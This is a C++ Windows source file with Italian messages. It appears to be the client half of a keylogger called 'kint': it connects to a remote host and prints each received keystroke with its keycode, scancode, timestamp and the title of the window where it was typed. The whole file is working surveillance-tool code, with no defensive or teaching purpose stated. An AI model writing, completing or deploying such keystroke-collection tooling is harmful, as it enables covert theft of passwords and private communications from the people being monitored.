// kint_client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WINSOCKAPI_

#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <kint_common.hpp>
#include <ctime>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("Uso: %s <host> <porta>", argv[0]);
        return 1;
    }

    printf("[*] Avvio di winsock\n");

    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("[!] Impossibile avviare winsock\n");
        printf("[!] WSAStartup: %s\n", kint_common::WsaErrorToString(iResult).c_str());
        return 1;
    }

    printf("[*] Winsock avviato, connessione al server %s:%s\n", argv[1], argv[2]);

    SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in sockaddr;
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = inet_addr(argv[1]);
    sockaddr.sin_port = htons(atoi(argv[2]));

    if (connect(server, (SOCKADDR*)&sockaddr, sizeof sockaddr) == SOCKET_ERROR) {
        printf("[!] connect(): Impossibile connettersi al server\n");
        printf("[!] WSAGetLastError: %s\n", kint_common::WsaErrorToString(WSAGetLastError()).c_str());
        return 1;
    }

    printf("[*] Connesso all'host\n");

    char data[sizeof kint_common::keypress_t] = { 0 };
    char tm[64];

    while (true) {
        int bytes = recv(server, data, sizeof kint_common::keypress_t, NULL);
        
        if (bytes == 0 || bytes == SOCKET_ERROR) {
            printf("[!] Errore durante la lettura del socket del server\n");
            printf("[!] WSAGetLastError: %s\n", kint_common::WsaErrorToString(WSAGetLastError()).c_str());
            return 1;
        }
        
        if (bytes != sizeof kint_common::keypress_t) {
            printf("[*] Ricevuto pacchetto malformato\n");
            continue;
        }

        kint_common::keypress_t* k = (kint_common::keypress_t*)data;
        std::string pressedKey = kint_common::IsHumanReadable(k->keycode) ? std::string(1, k->key) : kint_common::ToHumanReadable(k->keycode);
        std::tm* as_tm = std::localtime(&(k->timestamp));
        
        strftime(tm, sizeof tm, "%d/%m/%Y %H:%M:%S %Z", as_tm);

        printf("[*] Keypress '%s' dalla finestra '%s' ricevuto alle %s (virtual keycode 0x%x, scancode 0x%x)\n", pressedKey.c_str(), k->window_title, tm, k->keycode, k->scancode);
    }
}
